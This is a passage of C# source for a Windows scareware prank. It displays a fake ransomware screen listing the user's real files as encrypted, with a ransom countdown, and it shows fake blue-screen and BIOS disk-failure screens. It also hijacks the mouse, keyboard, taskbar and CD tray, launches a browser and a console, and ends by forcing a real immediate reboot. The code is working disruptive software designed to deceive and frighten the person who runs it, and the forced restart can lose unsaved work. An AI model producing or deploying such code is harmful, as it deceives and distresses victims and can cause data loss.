            Size = new Size((int)(w * 0.44), 26), ForeColor = Color.FromArgb(90, 170, 255),
            Font = new Font("Consolas", Math.Max(8f, h / 84f)) });

        var pay = new Button { Text = "DECRYPT FILES",
            Location = new Point((int)(w * 0.52), (int)(h * 0.71)),
            Size = new Size((int)(w * 0.15), (int)(h * 0.05)),
            BackColor = Color.FromArgb(200, 20, 20), ForeColor = Color.White, FlatStyle = FlatStyle.Flat };
        pay.FlatAppearance.BorderSize = 0;
        f.Controls.Add(pay);

        var support = new Button { Text = "Contact support",
            Location = new Point((int)(w * 0.52) + (int)(w * 0.16), (int)(h * 0.71)),
            Size = new Size((int)(w * 0.15), (int)(h * 0.05)),
            FlatStyle = FlatStyle.Flat, ForeColor = Color.FromArgb(200, 200, 200) };
        f.Controls.Add(support);

        Speak("Your files have been encrypted. All of your documents, photos and databases are locked.");

        f.Show(); f.Refresh();
        var sw = Stopwatch.StartNew();
        int idx = 0, lastSec = -1;
        long nextAdd = 0;
        while (sw.ElapsedMilliseconds < ms && Alive())
        {
            if (sw.ElapsedMilliseconds >= nextAdd && idx < files.Count)
            {
                lb.Items.Add("ENCRYPTED  " + files[idx++]);
                lb.TopIndex = Math.Max(0, lb.Items.Count - 1);
                cnt.Text = string.Format("Files encrypted: {0} / {1}", idx, files.Count);
                nextAdd = sw.ElapsedMilliseconds + 150;
            }
            int secs = (int)(sw.ElapsedMilliseconds / 1000);
            if (secs != lastSec)
            {
                lastSec = secs;
                int rem = 259200 - secs;
                cd.Text = string.Format("Time remaining: {0:00}:{1:00}:{2:00}",
                    rem / 3600, (rem / 60) % 60, rem % 60);
            }
            Application.DoEvents();
            Thread.Sleep(25);
        }
        f.Close(); f.Dispose(); proof.Dispose();
    }

    // ===================== FINALE: BSOD ===================================
    static void DrawFakeQr(Graphics g, int x, int y, int size)
    {
        int n = 21;
        float c = (float)size / n;
        g.FillRectangle(Brushes.White, x, y, size, size);
        var r = new Random(1337);
        for (int i = 0; i < n; i++)
            for (int j = 0; j < n; j++)
                if (r.Next(2) == 0) g.FillRectangle(Brushes.Black, x + i * c, y + j * c, c, c);
        int q = (int)(7 * c);
        g.FillRectangle(Brushes.White, x, y, q, q);
        g.FillRectangle(Brushes.Black, x, y, q, q);
        g.FillRectangle(Brushes.White, x + (int)c, y + (int)c, q - 2 * (int)c, q - 2 * (int)c);
        g.FillRectangle(Brushes.Black, x + 2 * (int)c, y + 2 * (int)c, q - 4 * (int)c, q - 4 * (int)c);
        g.FillRectangle(Brushes.White, x + size - q, y, q, q);
        g.FillRectangle(Brushes.Black, x + size - q, y, q, q);
        g.FillRectangle(Brushes.White, x + size - q + (int)c, y + (int)c, q - 2 * (int)c, q - 2 * (int)c);
        g.FillRectangle(Brushes.Black, x + size - q + 2 * (int)c, y + 2 * (int)c, q - 4 * (int)c, q - 4 * (int)c);
    }

    static void FakeBsod(int ms, bool reboot)
    {
        Rectangle b = Screen.PrimaryScreen.Bounds;
        var f = new Form { FormBorderStyle = FormBorderStyle.None, StartPosition = FormStartPosition.Manual,
            Bounds = b, BackColor = Color.FromArgb(0, 120, 215), TopMost = true, ShowInTaskbar = false };
        int percent = 0;
        float sc = b.Height / 1080f;
        f.Paint += (s, e) => {
            var g = e.Graphics;
            g.TextRenderingHint = System.Drawing.Text.TextRenderingHint.ClearTypeGridFit;
            using (var fs = new Font("Segoe UI", 92f * sc)) g.DrawString(":(", fs, Brushes.White, 100*sc, 70*sc);
            using (var fm = new Font("Segoe UI", 24f * sc))
                g.DrawString("Your device ran into a problem and needs to restart.\n" +
                             "We're just collecting some error info, and then we'll restart for you.",
                             fm, Brushes.White, new RectangleF(100*sc, 300*sc, 1500*sc, 130*sc));
            using (var fp = new Font("Segoe UI", 22f * sc)) g.DrawString(percent + "% complete", fp, Brushes.White, 100*sc, 470*sc);
            DrawFakeQr(g, (int)(100*sc), (int)(600*sc), (int)(120*sc));
            using (var fsm = new Font("Segoe UI", 13f * sc))
            {
                g.DrawString("For more information about this issue and possible fixes, visit https://www.windows.com/stopcode",
                    fsm, Brushes.White, new RectangleF(100*sc, 760*sc, 1500*sc, 40*sc));
                g.DrawString("If you call a support person, give them this info:\nStop code: CRITICAL_PROCESS_DIED",
                    fsm, Brushes.White, new RectangleF(100*sc, 830*sc, 1500*sc, 80*sc));
            }
        };
        f.Show(); f.Refresh();
        var sw = Stopwatch.StartNew();
        int last = -1;
        while (sw.ElapsedMilliseconds < ms && Alive())
        {
            int p = (int)Math.Min(99, sw.ElapsedMilliseconds * 99 / Math.Max(1, ms - 1200));
            if (p != last) { percent = p; last = p; f.Invalidate(); }
            Application.DoEvents();
            Thread.Sleep(40);
        }

        if (reboot)
        {
            percent = 99;
            try { f.Invalidate(); f.Refresh(); } catch { }
            var hold = Stopwatch.StartNew();
            while (hold.ElapsedMilliseconds < 1400) { Application.DoEvents(); Thread.Sleep(30); }
            if (AllowRealReboot)
            {
                try { CleanupTemp(); } catch { }
                RebootNow();
                Thread.Sleep(5000);   // only reached if the restart was blocked
            }
        }

        f.Close(); f.Dispose();
    }

    // ===================== FINALE: BIOS ===================================
    static void FakeBios(int ms)
    {
        Rectangle b = Screen.PrimaryScreen.Bounds;
        var f = new Form { FormBorderStyle = FormBorderStyle.None, StartPosition = FormStartPosition.Manual,
            Bounds = b, BackColor = Color.Black, TopMost = true, ShowInTaskbar = false };
        string[] lines = {
            "American Megatrends Inc. 2.19.1268",
            "BIOS Date: 11/02/2025   Ver: 1.14.03",
            "CPU: Intel(R) Core(TM) i7-12700K @ 3.60GHz",
            "Memory Test: 32768MB OK",
            "",
            "Detecting SATA devices ...",
            "Port 0 : WDC WD10EZEX-08WN4A0     : BAD",
            "Port 1 : Samsung SSD 980 PRO 1TB  : OK",
            "",
            "S.M.A.R.T. Status ................ FAILURE PREDICTED",
            "WARNING: Hard disk failure is imminent.",
            "",
            "Boot device not found.",
            "Please install an operating system on your hard disk.",
            "",
            "Press any key to continue . . ."
        };
        int shown = 0;
        float sc = b.Height / 1080f;
        f.Paint += (s, e) => {
            using (var font = new Font("Consolas", 15f * sc))
                for (int i = 0; i < shown && i < lines.Length; i++)
                    e.Graphics.DrawString(lines[i], font, Brushes.LightGray, 60*sc, (50 + i*28)*sc);
        };
        f.Show();
        var sw = Stopwatch.StartNew();
        while (sw.ElapsedMilliseconds < ms && Alive())
        {
            int want = (int)Math.Min(lines.Length, sw.ElapsedMilliseconds / 280 + 1);
            if (want != shown) { shown = want; f.Invalidate(); }
            Application.DoEvents();
            Thread.Sleep(30);
        }
        f.Close(); f.Dispose();
    }

    // ===================== restart ========================================
    static void CleanupTemp()
    {
        try { if (File.Exists(StopFile)) File.Delete(StopFile); } catch { }
        try { if (File.Exists(PidFile))  File.Delete(PidFile);  } catch { }
        try { if (File.Exists(SkullTxt)) File.Delete(SkullTxt); } catch { }
        try { if (File.Exists(Bat1Path)) File.Delete(Bat1Path); } catch { }
        try { if (File.Exists(Bat2Path)) File.Delete(Bat2Path); } catch { }
        try { foreach (string f2 in Directory.GetFiles(TempDir, "skull_wipe_*")) File.Delete(f2); } catch { }
    }

    static void RebootNow()
    {
        try
        {
            Process.Start(new ProcessStartInfo {
                FileName = "shutdown.exe",
                Arguments = "/r /t 0 /f",
                UseShellExecute = false,
                CreateNoWindow = true
            });
        }
        catch { }
    }

    // ===================== joke: skeleton dash ============================
    static Image SkelGif;
    static Stream SkelStream;

    static void EnsureSkel()
    {
        if (SkelGif != null) return;
        try
        {
            SkelStream = typeof(Program).Assembly.GetManifestResourceStream("skel.gif");
            if (SkelStream == null) return;
            SkelGif = Image.FromStream(SkelStream);
        }
        catch { }
    }

    static void SkeletonRun()
    {
        EnsureSkel();
        if (SkelGif == null) return;

        Rectangle b = Screen.PrimaryScreen.Bounds;
        int gh = (int)(b.Height * 0.32);
        if (gh < 80) gh = 80;
        int gw = (int)(gh * ((double)SkelGif.Width / SkelGif.Height));
        if (gw < 10) gw = gh;

        var f = new Form {
            FormBorderStyle = FormBorderStyle.None,
            StartPosition = FormStartPosition.Manual,
            Size = new Size(gw, gh),
            BackColor = Color.Magenta,
            TransparencyKey = Color.Magenta,
            TopMost = true,
            ShowInTaskbar = false
        };
        f.Paint += (s, e) => {
            try { e.Graphics.InterpolationMode = System.Drawing.Drawing2D.InterpolationMode.HighQualityBicubic; } catch { }
            e.Graphics.DrawImage(SkelGif, new Rectangle(0, 0, gw, gh));
        };

        System.Drawing.Imaging.FrameDimension fd = null;
        int frames = 1;
        try {
            fd = new System.Drawing.Imaging.FrameDimension(SkelGif.FrameDimensionsList[0]);
            frames = SkelGif.GetFrameCount(fd);
        } catch { }

        int y = b.Top + (int)(b.Height * 0.58) - gh / 2;
        int total = b.Width + gw;
        double dur = 2600;

        f.Location = new Point(b.Left - gw, y);
        f.Show();
        f.Refresh();

        var sw = Stopwatch.StartNew();
        long lastStep = -1;
        int fi = 0;
        while (sw.ElapsedMilliseconds < dur && Alive())
        {
            double t = sw.ElapsedMilliseconds / dur;
            f.Location = new Point(b.Left - gw + (int)(total * t), y);

            long step = sw.ElapsedMilliseconds / 65;
            if (step != lastStep)
            {
                lastStep = step;
                if (fd != null && frames > 1)
                {
                    try { SkelGif.SelectActiveFrame(fd, fi % frames); } catch { }
                    fi++;
                }
                f.Invalidate();
            }
            Application.DoEvents();
            Thread.Sleep(12);
        }
        f.Close();
        f.Dispose();
    }

    // ===================== intrusive (reversible) =========================
    static void ToggleCaps()
    {
        keybd_event(0x14, 0, 0, UIntPtr.Zero);
        keybd_event(0x14, 0, 2, UIntPtr.Zero);
    }

    static void CursorDrift(int ms)
    {
        Point start = Cursor.Position;
        var sw = Stopwatch.StartNew();
        double ang = 0;
        while (sw.ElapsedMilliseconds < ms && Alive())
        {
            ang += 0.35;
            SetCursorPos(start.X + (int)(Math.Cos(ang) * 120), start.Y + (int)(Math.Sin(ang) * 120));
            Thread.Sleep(15);
        }
    }

    static void CapsStrobe(int ms)
    {
        var sw = Stopwatch.StartNew();
        while (sw.ElapsedMilliseconds < ms && Alive()) { ToggleCaps(); Thread.Sleep(240); }
        try { if (Control.IsKeyLocked(Keys.CapsLock)) ToggleCaps(); } catch { }
    }

    static void MouseSwap(int ms)
    {
        try { SwapMouseButton(true); MouseSwapped = true; } catch { }
        var sw = Stopwatch.StartNew();
        while (sw.ElapsedMilliseconds < ms && Alive()) Thread.Sleep(50);
        try { SwapMouseButton(false); } catch { }
        MouseSwapped = false;
    }

    static void TaskbarHide(int ms)
    {
        try {
            IntPtr h = FindWindow("Shell_TrayWnd", null);
            if (h != IntPtr.Zero) { ShowWindow(h, 0); TaskbarHidden = true; }
        } catch { }
        var sw = Stopwatch.StartNew();
        while (sw.ElapsedMilliseconds < ms && Alive()) Thread.Sleep(50);
        try {
            IntPtr h = FindWindow("Shell_TrayWnd", null);
            if (h != IntPtr.Zero) ShowWindow(h, 5);
        } catch { }
        TaskbarHidden = false;
    }

    static void CdTray()
    {
        try {
            mciSendString("set cdaudio door open", null, 0, IntPtr.Zero);
            Thread.Sleep(2500);
            mciSendString("set cdaudio door closed", null, 0, IntPtr.Zero);
        } catch { }
    }

    static void DoIntrusive()
    {
        switch (Rng.Next(0, 6))
        {
            case 0: CursorDrift(2500); break;
            case 1: CapsStrobe(1800); break;
            case 2: MouseSwap(3500); break;
            case 3: TaskbarHide(3500); break;
            case 4: Ding(); Ding(); Ding(); break;
            case 5: CdTray(); break;
        }
    }

    // ===================== schedule =======================================
    static void LaunchBrowserOnce()
    {
        try { Process.Start(new ProcessStartInfo { FileName = BrowserUrl, UseShellExecute = true }); }
        catch { }
    }

    static void LaunchTerminalOnce()
    {
        try {
            Process.Start(new ProcessStartInfo { FileName = "cmd.exe",
                Arguments = "/k cd /d \"%USERPROFILE%\" & dir /s",
                UseShellExecute = true, WindowStyle = ProcessWindowStyle.Normal });
        } catch { }
    }

    static bool CheckSchedule()
    {
        if (!Alive()) return false;
        double el = Elapsed;
        if (!BrowserDone && el >= BrowserDelaySec)
        {
            LaunchBrowserOnce(); BrowserDone = true; BrowserAt = DateTime.UtcNow;
        }
        if (BrowserDone && !TerminalDone && (DateTime.UtcNow - BrowserAt).TotalSeconds >= TerminalDelaySec)
        {
            LaunchTerminalOnce(); TerminalDone = true;
        }
        return true;
    }

    // ===================== chaos ==========================================
    static bool WaitChaos(int seconds)
    {
        DateTime end = DateTime.UtcNow.AddSeconds(seconds);
        while (DateTime.UtcNow < end)
        {
            if (!CheckSchedule()) return false;
            Thread.Sleep(400);
        }
        return CheckSchedule();
    }

    static void DoRandomEvent()
    {
        if (Rng.Next(0, 100) < 7) { SkeletonRun(); return; }

        int r = Rng.Next(0, 100);
        if (r < SkullPercent)
        {
            try { SendKeys.SendWait(((char)Rng.Next('a', 'z' + 1)).ToString()); } catch { }
            PlayRandomBeep();
            ShowFlicker(Rng.Next(160, 320));
        }
        else if (r < NotifPercent)
        {
            ShowNotification(Notifs[Rng.Next(Notifs.Length)]);
        }
        else if (Elapsed >= IntrusiveAfterSec)
        {
            DoIntrusive();
        }
        else
        {
            ShowNotification(Notifs[Rng.Next(Notifs.Length)]);
        }
    }

    static void RunFinale()
    {
        if (!Alive()) return;
        List<string> files = CollectFiles(260);

        FrozenScreen(3000);           if (!Alive()) return;
        Glitch(4500);                 if (!Alive()) return;
        FakeDeletion(files, 4000);    if (!Alive()) return;
        SpeakLine();                  if (!Alive()) return;
        FakeRansomware(files, 26000); if (!Alive()) return;
        FakeBios(3000);               if (!Alive()) return;
        ShowBlackout(1);              if (!Alive()) return;

        // last thing on screen: BSOD hits 99%, then the machine really restarts.
        FakeBsod(5000, true);
    }

    static void RunChaos()
    {
        double nextFinale = FirstFinaleSec;
        while (true)
        {
            if (Elapsed >= nextFinale)
            {
                RunFinale();
#if PRANK_LOOP
                nextFinale += FinaleEverySec;
                if (!SilenceWait(SilenceAfterSec)) return;
                continue;
#else
                // The finale is the end of the show; a reboot build never returns here.
                return;
#endif
            }

            int gap = Rng.Next(GapMin, GapMax + 1);
            if (!WaitChaos(gap)) return;
            DoRandomEvent();
        }
    }
}
